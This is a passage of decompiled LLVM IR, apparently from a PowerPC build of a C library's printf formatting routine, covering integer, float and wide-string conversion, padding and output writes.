  %v1_1001a780 = call i32 @__asm_rlwinm(i32 %v3_1001a77c, i32 0, i32 20, i32 23)
  br label %dec_label_pc_1001a784

dec_label_pc_1001a784:                            ; preds = %dec_label_pc_1001a768, %dec_label_pc_1001a774
  %v3_1001a784 = load i32, i32* %stack_var_-344, align 4
  %v0_1001a788 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1001a788, i32* @r5, align 4
  %v2_1001a78c = inttoptr i32 %v0_1001a788 to i32*
  %v3_1001a78c = call i32 @_load_inttype(i32 %v3_1001a784, i32* %v2_1001a78c)
  store i32 %v0_1001a788, i32* %r7.global-to-local, align 4
  %v0_1001a79c = load i32, i32* %r31.global-to-local, align 4
  %v6_1001a7a4 = call i32 @_uintmaxtostr(i8* %v5_1001a7a4, i32 %v3_1001a78c, i32 %v3_1001a784, i32 %v0_1001a788, i32 %v0_1001a79c)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_1001a7a4, i32* %r30.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_1001a7f8, label %dec_label_pc_1001a7b8

dec_label_pc_1001a7b8:                            ; preds = %dec_label_pc_1001a784
  %v7_1001a7a4 = inttoptr i32 %v6_1001a7a4 to i8*
  %v3_1001a7b8 = load i8, i8* %v7_1001a7a4, align 1
  %v4_1001a7b8 = zext i8 %v3_1001a7b8 to i32
  store i32 %v4_1001a7b8, i32* %r0.global-to-local, align 4
  %v3_1001a7c0 = icmp eq i8 %v3_1001a7b8, 45
  br i1 %v3_1001a7c0, label %dec_label_pc_1001a7c8, label %dec_label_pc_1001a7dc

dec_label_pc_1001a7c8:                            ; preds = %dec_label_pc_1001a7b8
  %v1_1001a7c8 = or i32 %v0_1001a7ec, 2
  store i32 %v1_1001a7c8, i32* %r0.global-to-local, align 4
  %v2_1001a7cc = add i32 %v6_1001a7a4, 1
  store i32 %v2_1001a7cc, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_1001a7f8

dec_label_pc_1001a7dc:                            ; preds = %dec_label_pc_1001a7b8
  %v1_1001a7dc = and i32 %v0_1001a7ec, 2
  store i32 %v1_1001a7dc, i32* %r0.global-to-local, align 4
  %v3_1001a7dc = icmp eq i32 %v1_1001a7dc, 0
  br i1 %v3_1001a7dc, label %dec_label_pc_1001a7ec, label %dec_label_pc_1001a7e4

dec_label_pc_1001a7e4:                            ; preds = %dec_label_pc_1001a7dc
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1001a7f8

dec_label_pc_1001a7ec:                            ; preds = %dec_label_pc_1001a7dc
  %v1_1001a7ec = urem i32 %v0_1001a7ec, 2
  store i32 %v1_1001a7ec, i32* %r11.global-to-local, align 4
  %v3_1001a7ec = icmp eq i32 %v1_1001a7ec, 0
  br i1 %v3_1001a7ec, label %dec_label_pc_1001a7f8, label %dec_label_pc_1001a7f4

dec_label_pc_1001a7f4:                            ; preds = %dec_label_pc_1001a7ec
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_1001a7f8

dec_label_pc_1001a7f8:                            ; preds = %dec_label_pc_1001a7ec, %dec_label_pc_1001a784, %dec_label_pc_1001a7e4, %dec_label_pc_1001a7c8, %dec_label_pc_1001a7f4
  %v0_1001a864 = phi i32 [ %v6_1001a7a4, %dec_label_pc_1001a784 ], [ %v2_1001a7cc, %dec_label_pc_1001a7c8 ], [ %v6_1001a7a4, %dec_label_pc_1001a7ec ], [ %v6_1001a7a4, %dec_label_pc_1001a7f4 ], [ %v6_1001a7a4, %dec_label_pc_1001a7e4 ]
  %stack_var_-184.0 = phi i32 [ %v0_1001a7ec, %dec_label_pc_1001a784 ], [ %v1_1001a7c8, %dec_label_pc_1001a7c8 ], [ %v0_1001a7ec, %dec_label_pc_1001a7ec ], [ %v0_1001a7ec, %dec_label_pc_1001a7f4 ], [ %v0_1001a7ec, %dec_label_pc_1001a7e4 ]
  %v3_1001a7f8 = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_1001aa0c, i32* %r0.global-to-local, align 4
  %v2_1001a800 = sub i32 %v2_1001aa0c, %v0_1001a864
  %v1_1001a808 = add i32 %v2_1001a800, 127
  store i32 %v1_1001a808, i32* %r31.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_1001a7f8, -1
  br i1 %tmp76, label %dec_label_pc_1001a814, label %dec_label_pc_1001a810

dec_label_pc_1001a810:                            ; preds = %dec_label_pc_1001a7f8
  br label %dec_label_pc_1001a814

dec_label_pc_1001a814:                            ; preds = %dec_label_pc_1001a7f8, %dec_label_pc_1001a810
  %v0_1001a848 = phi i32 [ %v3_1001a7f8, %dec_label_pc_1001a7f8 ], [ 1, %dec_label_pc_1001a810 ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_1001a818 = and i32 %stack_var_-184.0, 16
  store i32 %v1_1001a818, i32* @r11, align 4
  %v3_1001a818 = icmp eq i32 %v1_1001a818, 0
  br i1 %v3_1001a818, label %dec_label_pc_1001a864, label %dec_label_pc_1001a820

dec_label_pc_1001a820:                            ; preds = %dec_label_pc_1001a814
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_1001a824, label %dec_label_pc_1001a830, label %dec_label_pc_1001a840.thread

dec_label_pc_1001a840.thread:                     ; preds = %dec_label_pc_1001a820
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_1001a864

dec_label_pc_1001a830:                            ; preds = %dec_label_pc_1001a820
  br i1 %v3_1001a830, label %dec_label_pc_1001a838, label %dec_label_pc_1001a840

dec_label_pc_1001a838:                            ; preds = %dec_label_pc_1001a830
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_1001a864

dec_label_pc_1001a840:                            ; preds = %dec_label_pc_1001a830
  br i1 %v3_1001a840, label %dec_label_pc_1001a848, label %dec_label_pc_1001a864

dec_label_pc_1001a848:                            ; preds = %dec_label_pc_1001a840
  %v3_1001a848 = icmp ugt i32 %v0_1001a848, %v1_1001a808
  br i1 %v3_1001a848, label %dec_label_pc_1001a864, label %dec_label_pc_1001a850

dec_label_pc_1001a850:                            ; preds = %dec_label_pc_1001a848
  %v1_1001a850 = inttoptr i32 %v0_1001a864 to i8*
  %v2_1001a850 = load i8, i8* %v1_1001a850, align 1
  %v3_1001a850 = zext i8 %v2_1001a850 to i32
  store i32 %v3_1001a850, i32* %r0.global-to-local, align 4
  %v3_1001a858 = icmp eq i8 %v2_1001a850, 48
  br i1 %v3_1001a858, label %dec_label_pc_1001a864, label %dec_label_pc_1001a860

dec_label_pc_1001a860:                            ; preds = %dec_label_pc_1001a850
  %v1_1001a860 = add i32 %v2_1001a800, 128
  br label %dec_label_pc_1001a864

dec_label_pc_1001a864:                            ; preds = %dec_label_pc_1001a840.thread, %dec_label_pc_1001a840, %dec_label_pc_1001a850, %dec_label_pc_1001a848, %dec_label_pc_1001a814, %dec_label_pc_1001a838, %dec_label_pc_1001a860
  %v1_1001a8ac = phi i32 [ %v0_1001a848, %dec_label_pc_1001a840 ], [ 1, %dec_label_pc_1001a850 ], [ %v0_1001a848, %dec_label_pc_1001a848 ], [ %v0_1001a848, %dec_label_pc_1001a814 ], [ %v0_1001a848, %dec_label_pc_1001a838 ], [ %v1_1001a860, %dec_label_pc_1001a860 ], [ %v0_1001a848, %dec_label_pc_1001a840.thread ]
  %v1_1001a864 = inttoptr i32 %v0_1001a864 to i8*
  %v2_1001a864 = load i8, i8* %v1_1001a864, align 1
  %v3_1001a864 = zext i8 %v2_1001a864 to i32
  store i32 %v3_1001a864, i32* %r0.global-to-local, align 4
  %v3_1001a868 = icmp eq i8 %v2_1001a864, 48
  br i1 %v3_1001a868, label %dec_label_pc_1001a870, label %dec_label_pc_1001a8a8

dec_label_pc_1001a870:                            ; preds = %dec_label_pc_1001a864
  %v0_1001a870 = load i32, i32* @r27, align 4
  %tmp77 = icmp slt i32 %v0_1001a870, 6
  br i1 %tmp77, label %dec_label_pc_1001a87c, label %dec_label_pc_1001a878

dec_label_pc_1001a878:                            ; preds = %dec_label_pc_1001a870
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_1001a87c

dec_label_pc_1001a87c:                            ; preds = %dec_label_pc_1001a870, %dec_label_pc_1001a878
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_1001a880, label %dec_label_pc_1001a888, label %dec_label_pc_1001a898

dec_label_pc_1001a888:                            ; preds = %dec_label_pc_1001a87c
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1002e408.1164 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001aa24

dec_label_pc_1001a898:                            ; preds = %dec_label_pc_1001a87c
  %v3_1001a898 = icmp eq i32 %v1_1001a8ac, 0
  br i1 %v3_1001a898, label %dec_label_pc_1001a8a0, label %dec_label_pc_1001a8a8

dec_label_pc_1001a8a0:                            ; preds = %dec_label_pc_1001a898
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001aa24

dec_label_pc_1001a8a8:                            ; preds = %dec_label_pc_1001a898, %dec_label_pc_1001a864
  %v3_1001a8a8 = icmp ugt i32 %v1_1001a8ac, %v1_1001a808
  %v2_1001a8ac = sub i32 %v1_1001a8ac, %v1_1001a808
  store i32 %v2_1001a8ac, i32* %r29.global-to-local, align 4
  br i1 %v3_1001a8a8, label %dec_label_pc_1001aa44thread-pre-split, label %dec_label_pc_1001aa24

dec_label_pc_1001a8b8:                            ; preds = %dec_label_pc_1001a6d8
  br i1 %v2_1001a8b8, label %dec_label_pc_1001a8ec, label %dec_label_pc_1001a8c0

dec_label_pc_1001a8c0:                            ; preds = %dec_label_pc_1001a8b8
  %v3_1001a8c0 = load i32, i32* %stack_var_-344, align 4
  %v0_1001a8cc = load i32, i32* @r24, align 4
  store i32 268544220, i32* @lr, align 4
  %v5_1001a8d8 = call i32 @_fpmaxtostr(i32 %v0_1001a8cc, i32* nonnull %stack_var_-196, i32 268543156, i32 %v3_1001a8c0)
  %v1_1001a8dc = icmp slt i32 %v5_1001a8d8, 0
  br i1 %v1_1001a8dc, label %dec_label_pc_1001aba8, label %dec_label_pc_1001a8e4

dec_label_pc_1001a8e4:                            ; preds = %dec_label_pc_1001a8c0
  %v0_1001a8e4 = load i32, i32* %r23.global-to-local, align 4
  %v2_1001a8e4 = add i32 %v0_1001a8e4, %v5_1001a8d8
  store i32 %v2_1001a8e4, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1001ab94

dec_label_pc_1001a8ec:                            ; preds = %dec_label_pc_1001a8b8
  br i1 %v2_1001a8ec, label %dec_label_pc_1001a994, label %dec_label_pc_1001a8f4

dec_label_pc_1001a8f4:                            ; preds = %dec_label_pc_1001a8ec
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_1001a900 = load i32, i32* %stack_var_-344, align 4
  %v1_1001a908 = inttoptr i32 %v3_1001a900 to i32*
  %v2_1001a908 = load i32, i32* %v1_1001a908, align 4
  br i1 %v3_1001a8ec, label %dec_label_pc_1001a908, label %dec_label_pc_1001a95c

dec_label_pc_1001a908:                            ; preds = %dec_label_pc_1001a8f4
  store i32 %v2_1001a908, i32* %r0.global-to-local, align 4
  %v3_1001a90c = icmp eq i32 %v2_1001a908, 0
  store i32 %v2_1001a908, i32* %stack_var_-340, align 4
  br i1 %v3_1001a90c, label %dec_label_pc_1001aa2c, label %dec_label_pc_1001a918

dec_label_pc_1001a918:                            ; preds = %dec_label_pc_1001a908
  %v3_1001a918 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1001a918, i32* %r0.global-to-local, align 4
  %v1_1001a920 = icmp slt i32 %v3_1001a918, 0
  br i1 %v1_1001a920, label %dec_label_pc_1001a92c, label %dec_label_pc_1001a928

dec_label_pc_1001a928:                            ; preds = %dec_label_pc_1001a918
  br label %dec_label_pc_1001a92c

dec_label_pc_1001a92c:                            ; preds = %dec_label_pc_1001a918, %dec_label_pc_1001a928
  %storemerge94 = phi i32 [ %v3_1001a918, %dec_label_pc_1001a928 ], [ -1, %dec_label_pc_1001a918 ]
  store i32 %storemerge94, i32* @r5, align 4
  store i32 %v2_1001a92c, i32* @r3, align 4
  store i32 %v2_1001a930, i32* @r6, align 4
  store i32 %v2_1001a92c, i32* @r4, align 4
  store i32 268544316, i32* @lr, align 4
  %v0_1001a938 = call i32 @__GI_wcsrtombs()
  %v3_1001a93c = icmp eq i32 %v0_1001a938, -1
  store i32 %v0_1001a938, i32* @r31, align 4
  br i1 %v3_1001a93c, label %dec_label_pc_1001aba8, label %dec_label_pc_1001a948

dec_label_pc_1001a948:                            ; preds = %dec_label_pc_1001a92c
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001aa44

dec_label_pc_1001a95c:                            ; preds = %dec_label_pc_1001a8f4
  store i32 %v2_1001aa0c, i32* @r28, align 4
  store i32 268544368, i32* @lr, align 4
  %v3_1001a96c = call i32 @__GI_wcrtomb(i32 %v2_1001aa0c, i32 %v2_1001a908, i32 %v2_1001a930)
  %v3_1001a970 = icmp eq i32 %v3_1001a96c, -1
  store i32 %v3_1001a96c, i32* @r31, align 4
  br i1 %v3_1001a970, label %dec_label_pc_1001aba8, label %dec_label_pc_1001a97c

dec_label_pc_1001a97c:                            ; preds = %dec_label_pc_1001a95c
  store i32 %v2_1001aa0c, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_1001a98c = load i32, i32* @r25, align 4
  %v1_1001a98c = load i32, i32* @r28, align 4
  %v3_1001a98c = trunc i32 %v0_1001a98c to i8
  %v4_1001a98c = add i32 %v1_1001a98c, %v3_1001a96c
  %v5_1001a98c = inttoptr i32 %v4_1001a98c to i8*
  store i8 %v3_1001a98c, i8* %v5_1001a98c, align 1
  %v0_1001aa48.pre.pre = load i32, i32* @r31, align 4
  %v1_1001aa48.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1001aa44thread-pre-split

dec_label_pc_1001a994:                            ; preds = %dec_label_pc_1001a8ec
  br i1 %v2_1001a994, label %dec_label_pc_1001aa00, label %dec_label_pc_1001a99c

dec_label_pc_1001a99c:                            ; preds = %dec_label_pc_1001a994
  %v3_1001a9a0 = load i32, i32* %stack_var_-344, align 4
  %v1_1001a9a8 = inttoptr i32 %v3_1001a9a0 to i32*
  %v2_1001a9a8 = load i32, i32* %v1_1001a9a8, align 4
  br i1 %v3_1001a994, label %dec_label_pc_1001a9a8, label %dec_label_pc_1001a9d8

dec_label_pc_1001a9a8:                            ; preds = %dec_label_pc_1001a99c
  store i32 %v2_1001a9a8, i32* %r30.global-to-local, align 4
  %v3_1001a9ac = icmp eq i32 %v2_1001a9a8, 0
  br i1 %v3_1001a9ac, label %dec_label_pc_1001aa2c, label %dec_label_pc_1001a9b4

dec_label_pc_1001a9b4:                            ; preds = %dec_label_pc_1001a9a8, %dec_label_pc_1001aa08
  %v0_1001a9c8 = phi i32 [ %v2_1001a9a8, %dec_label_pc_1001a9a8 ], [ %v3_1001aa18, %dec_label_pc_1001aa08 ]
  %v3_1001a9b4 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1001a9b4, i32* %r0.global-to-local, align 4
  %v1_1001a9bc = icmp slt i32 %v3_1001a9b4, 0
  br i1 %v1_1001a9bc, label %dec_label_pc_1001a9c8, label %dec_label_pc_1001a9c4

dec_label_pc_1001a9c4:                            ; preds = %dec_label_pc_1001a9b4
  br label %dec_label_pc_1001a9c8

dec_label_pc_1001a9c8:                            ; preds = %dec_label_pc_1001a9b4, %dec_label_pc_1001a9c4
  %storemerge95 = phi i32 [ %v3_1001a9b4, %dec_label_pc_1001a9c4 ], [ -1, %dec_label_pc_1001a9b4 ]
  store i32 %storemerge95, i32* @r4, align 4
  store i32 268544464, i32* @lr, align 4
  %v1_1001a9cc = inttoptr i32 %v0_1001a9c8 to i8*
  %v2_1001a9cc = call i32 @strnlen(i8* %v1_1001a9cc)
  store i32 %v2_1001a9cc, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001aa38

dec_label_pc_1001a9d8:                            ; preds = %dec_label_pc_1001a99c
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 %v2_1001a9a8, i32* %stack_var_-328, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_1001aa0c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001aa44thread-pre-split

dec_label_pc_1001aa00:                            ; preds = %dec_label_pc_1001a994
  br i1 %v3_1001aa00, label %dec_label_pc_1001aa08, label %dec_label_pc_1001aba8

dec_label_pc_1001aa08:                            ; preds = %dec_label_pc_1001aa00
  %v0_1001aa08 = call i32 @__errno_location()
  %v1_1001aa10 = inttoptr i32 %v0_1001aa08 to i32*
  %v2_1001aa10 = load i32, i32* %v1_1001aa10, align 4
  store i32 %v2_1001aa10, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268544540, i32* @lr, align 4
  %v3_1001aa18 = call i32 @__GI___glibc_strerror_r(i32 %v2_1001aa10, i32 %v2_1001aa0c, i32 128)
  store i32 %v3_1001aa18, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001a9b4

dec_label_pc_1001aa24:                            ; preds = %dec_label_pc_1001a8a8, %dec_label_pc_1001a8a0, %dec_label_pc_1001a888
  %v0_1001aa48.pre41 = phi i32 [ %v1_1001a808, %dec_label_pc_1001a8a8 ], [ 0, %dec_label_pc_1001a8a0 ], [ 5, %dec_label_pc_1001a888 ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1001aa44thread-pre-split

dec_label_pc_1001aa2c:                            ; preds = %dec_label_pc_1001a9a8, %dec_label_pc_1001a908
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1002e410.1165 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001aa38

dec_label_pc_1001aa38:                            ; preds = %dec_label_pc_1001a9c8, %dec_label_pc_1001aa2c
  %v0_1001aa4829 = phi i32 [ %v2_1001a9cc, %dec_label_pc_1001a9c8 ], [ 6, %dec_label_pc_1001aa2c ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_1001aa44

dec_label_pc_1001aa44thread-pre-split:            ; preds = %dec_label_pc_1001a97c, %dec_label_pc_1001a9d8, %dec_label_pc_1001aa24, %dec_label_pc_1001a8a8
  %v1_1001aa48.pre = phi i32 [ %v2_1001a8ac, %dec_label_pc_1001a8a8 ], [ 0, %dec_label_pc_1001aa24 ], [ %v1_1001aa48.pre.pre, %dec_label_pc_1001a97c ], [ 0, %dec_label_pc_1001a9d8 ]
  %v0_1001aa48.pre = phi i32 [ %v1_1001a808, %dec_label_pc_1001a8a8 ], [ %v0_1001aa48.pre41, %dec_label_pc_1001aa24 ], [ %v0_1001aa48.pre.pre, %dec_label_pc_1001a97c ], [ 1, %dec_label_pc_1001a9d8 ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_1001a8a8 ], [ %stack_var_-184.0, %dec_label_pc_1001aa24 ], [ %v0_1001a7ec, %dec_label_pc_1001a97c ], [ %v0_1001a7ec, %dec_label_pc_1001a9d8 ]
  %v0_1001aa44.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_1001aa44

dec_label_pc_1001aa44:                            ; preds = %dec_label_pc_1001aa44thread-pre-split, %dec_label_pc_1001a948, %dec_label_pc_1001aa38
  %v1_1001aa48 = phi i32 [ %v1_1001aa48.pre, %dec_label_pc_1001aa44thread-pre-split ], [ 0, %dec_label_pc_1001a948 ], [ 0, %dec_label_pc_1001aa38 ]
  %v0_1001aa48 = phi i32 [ %v0_1001aa48.pre, %dec_label_pc_1001aa44thread-pre-split ], [ %v0_1001a938, %dec_label_pc_1001a948 ], [ %v0_1001aa4829, %dec_label_pc_1001aa38 ]
  %v0_1001aa50 = phi i32 [ %v0_1001aa44.pr, %dec_label_pc_1001aa44thread-pre-split ], [ 11, %dec_label_pc_1001a948 ], [ 11, %dec_label_pc_1001aa38 ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_1001aa44thread-pre-split ], [ %v0_1001a7ec, %dec_label_pc_1001a948 ], [ %v0_1001a7ec, %dec_label_pc_1001aa38 ]
  %v3_1001aa44 = icmp eq i32 %v0_1001aa50, 11
  %v2_1001aa48 = add i32 %v0_1001aa48, %v1_1001aa48
  store i32 %v2_1001aa48, i32* %r0.global-to-local, align 4
  br i1 %v3_1001aa44, label %dec_label_pc_1001aa64, label %dec_label_pc_1001aa50

dec_label_pc_1001aa50:                            ; preds = %dec_label_pc_1001aa44
  %v0_1001aa54 = call i32 @__asm_mfcr()
  %v1_1001aa58 = call i32 @__asm_rlwinm(i32 %v0_1001aa54, i32 30, i32 31, i32 31)
  %v1_1001aa5c = add i32 %v1_1001aa58, 1
  %v0_1001aa60 = load i32, i32* %r0.global-to-local, align 4
  %v2_1001aa60 = add i32 %v0_1001aa60, %v1_1001aa5c
  store i32 %v2_1001aa60, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001aa64

dec_label_pc_1001aa64:                            ; preds = %dec_label_pc_1001aa44, %dec_label_pc_1001aa50
  %v0_1001aa7c = phi i32 [ %v2_1001aa48, %dec_label_pc_1001aa44 ], [ %v2_1001aa60, %dec_label_pc_1001aa50 ]
  %v3_1001aa6c = icmp ugt i32 %tmp, %v0_1001aa7c
  br i1 %v3_1001aa6c, label %dec_label_pc_1001aa74, label %dec_label_pc_1001aa78

dec_label_pc_1001aa74:                            ; preds = %dec_label_pc_1001aa64
  %v2_1001aa74 = sub i32 %tmp, %v0_1001aa7c
  br label %dec_label_pc_1001aa78

dec_label_pc_1001aa78:                            ; preds = %dec_label_pc_1001aa64, %dec_label_pc_1001aa74
  %storemerge93 = phi i32 [ %v2_1001aa74, %dec_label_pc_1001aa74 ], [ 0, %dec_label_pc_1001aa64 ]
  %v1_1001aa88 = phi i32 [ %v2_1001aa74, %dec_label_pc_1001aa74 ], [ 0, %dec_label_pc_1001aa64 ]
  store i32 %storemerge93, i32* @r28, align 4
  %v0_1001aa78 = load i32, i32* @r26, align 4
  %v3_1001aa78 = icmp eq i32 %v0_1001aa78, 48
  %v2_1001aa7c = add i32 %v1_1001aa88, %v0_1001aa7c
  store i32 %v2_1001aa7c, i32* %r0.global-to-local, align 4
  %v0_1001aa80 = load i32, i32* %r23.global-to-local, align 4
  %v2_1001aa80 = add i32 %v0_1001aa80, %v2_1001aa7c
  store i32 %v2_1001aa80, i32* %r23.global-to-local, align 4
  br i1 %v3_1001aa78, label %dec_label_pc_1001aa88, label %dec_label_pc_1001aa90

dec_label_pc_1001aa88:                            ; preds = %dec_label_pc_1001aa78
  %v0_1001aa88 = load i32, i32* %r29.global-to-local, align 4
  %v2_1001aa88 = add i32 %v0_1001aa88, %v1_1001aa88
  store i32 %v2_1001aa88, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1001aa90

dec_label_pc_1001aa90:                            ; preds = %dec_label_pc_1001aa78, %dec_label_pc_1001aa88
  %v0_1001aaa4 = phi i32 [ %v1_1001aa88, %dec_label_pc_1001aa78 ], [ 0, %dec_label_pc_1001aa88 ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_1001aa94 = and i32 %stack_var_-184.1, 8
  %v3_1001aa94 = icmp eq i32 %v1_1001aa94, 0
  br i1 %v3_1001aa94, label %dec_label_pc_1001aa9c, label %dec_label_pc_1001aab8

dec_label_pc_1001aa9c:                            ; preds = %dec_label_pc_1001aa90
  %v0_1001aa9c = load i32, i32* @r24, align 4
  store i32 268544684, i32* @lr, align 4
  %v4_1001aaa8 = call i32 @_charpad(i32 %v0_1001aa9c, i8 32, i32 %v0_1001aaa4)
  %v1_1001aaac = load i32, i32* @r28, align 4
  %v4_1001aaac = icmp eq i32 %v4_1001aaa8, %v1_1001aaac
  br i1 %v4_1001aaac, label %dec_label_pc_1001aab4, label %dec_label_pc_1001aba8

dec_label_pc_1001aab4:                            ; preds = %dec_label_pc_1001aa9c
  br label %dec_label_pc_1001aab8

dec_label_pc_1001aab8:                            ; preds = %dec_label_pc_1001aa90, %dec_label_pc_1001aab4
  %v0_1001aabc = load i32, i32* @r24, align 4
  %v0_1001aac4 = load i32, i32* @r27, align 4
  %v2_1001aac4 = add i32 %v0_1001aac4, ptrtoint (i32* @global_var_1002e418.1166 to i32)
  store i32 268544716, i32* @lr, align 4
  %v2_1001aac8 = call i32 @__GI_fputs_unlocked(i32 %v2_1001aac4, i32 %v0_1001aabc)
  %v0_1001aacc = load i32, i32* @r24, align 4
  %v0_1001aad4 = load i32, i32* @r29, align 4
  store i32 268544732, i32* @lr, align 4
  %v4_1001aad8 = call i32 @_charpad(i32 %v0_1001aacc, i8 48, i32 %v0_1001aad4)
  %v1_1001aadc = load i32, i32* @r29, align 4
  %v4_1001aadc = icmp eq i32 %v4_1001aad8, %v1_1001aadc
  br i1 %v4_1001aadc, label %dec_label_pc_1001aae4, label %dec_label_pc_1001aba8

dec_label_pc_1001aae4:                            ; preds = %dec_label_pc_1001aab8
  %v3_1001aae4 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_1001aae4, i32* %r0.global-to-local, align 4
  %v3_1001aae8 = icmp eq i32 %v3_1001aae4, 0
  br i1 %v3_1001aae8, label %dec_label_pc_1001aaf0, label %dec_label_pc_1001ab18

dec_label_pc_1001aaf0:                            ; preds = %dec_label_pc_1001aae4
  %v0_1001aaf0 = load i32, i32* @r31, align 4
  %v3_1001aaf0 = icmp eq i32 %v0_1001aaf0, 0
  br i1 %v3_1001aaf0, label %dec_label_pc_1001ab0c.thread, label %dec_label_pc_1001ab0c

dec_label_pc_1001ab0c.thread:                     ; preds = %dec_label_pc_1001aaf0
  br label %dec_label_pc_1001ab7c

dec_label_pc_1001ab0c:                            ; preds = %dec_label_pc_1001aaf0
  %v0_1001aafc = load i32, i32* @r30, align 4
  %v0_1001ab04 = load i32, i32* @r24, align 4
  store i32 268544780, i32* @lr, align 4
  %v4_1001ab08 = inttoptr i32 %v0_1001ab04 to i16*
  %v5_1001ab08 = call i32 @__stdio_fwrite(i32 %v0_1001aafc, i32 %v0_1001aaf0, i16* %v4_1001ab08)
  %v1_1001ab0c.pre = load i32, i32* @r31, align 4
  %v4_1001ab0c = icmp eq i32 %v5_1001ab08, %v1_1001ab0c.pre
  br i1 %v4_1001ab0c, label %dec_label_pc_1001ab7c, label %dec_label_pc_1001aba8

dec_label_pc_1001ab18:                            ; preds = %dec_label_pc_1001aae4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_1001ab5c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001ab5c

dec_label_pc_1001ab24:                            ; preds = %dec_label_pc_1001ab5c
  %tmp78 = icmp ult i32 %v0_1001ab74, 129
  br i1 %tmp78, label %dec_label_pc_1001ab2c, label %dec_label_pc_1001ab28

dec_label_pc_1001ab28:                            ; preds = %dec_label_pc_1001ab24
  store i32 128, i32* @r5, align 4
  br label %dec_label_pc_1001ab2c

dec_label_pc_1001ab2c:                            ; preds = %dec_label_pc_1001ab24, %dec_label_pc_1001ab28
  store i32 ptrtoint (i32* @global_var_1001ab30.1167 to i32), i32* @lr, align 4
  %v0_1001ab2c = call i32 @__GI_wcsrtombs()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_1001ab2c, i32* @r30, align 4
  %v3_1001ab34 = icmp eq i32 %v0_1001ab2c, 0
  br i1 %v3_1001ab34, label %dec_label_pc_1001ab50, label %dec_label_pc_1001ab48

dec_label_pc_1001ab48:                            ; preds = %dec_label_pc_1001ab2c
  %v0_1001ab38 = load i32, i32* @r24, align 4
  store i32 268544844, i32* @lr, align 4
  %v3_1001ab48 = inttoptr i32 %v0_1001ab38 to i16*
  %v4_1001ab48 = call i32 @__stdio_fwrite(i32 %v2_1001aa0c, i32 %v0_1001ab2c, i16* %v3_1001ab48)
  store i32 %v4_1001ab48, i32* %r0.global-to-local, align 4
  %v1_1001ab50.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001ab50

dec_label_pc_1001ab50:                            ; preds = %dec_label_pc_1001ab2c, %dec_label_pc_1001ab48
  %v1_1001ab50 = phi i32 [ 0, %dec_label_pc_1001ab2c ], [ %v1_1001ab50.pre, %dec_label_pc_1001ab48 ]
  %v0_1001ab54 = phi i32 [ 0, %dec_label_pc_1001ab2c ], [ %v4_1001ab48, %dec_label_pc_1001ab48 ]
  %v4_1001ab50 = icmp eq i32 %v0_1001ab54, %v1_1001ab50
  %v1_1001ab54 = load i32, i32* @r31, align 4
  %v2_1001ab54 = sub i32 %v1_1001ab54, %v0_1001ab54
  store i32 %v2_1001ab54, i32* @r31, align 4
  br i1 %v4_1001ab50, label %dec_label_pc_1001ab5c, label %dec_label_pc_1001aba8

dec_label_pc_1001ab5c:                            ; preds = %dec_label_pc_1001ab50, %dec_label_pc_1001ab18
  %v0_1001ab74 = phi i32 [ %v2_1001ab54, %dec_label_pc_1001ab50 ], [ %v0_1001ab5c.pre, %dec_label_pc_1001ab18 ]
  %v3_1001ab5c = icmp eq i32 %v0_1001ab74, 0
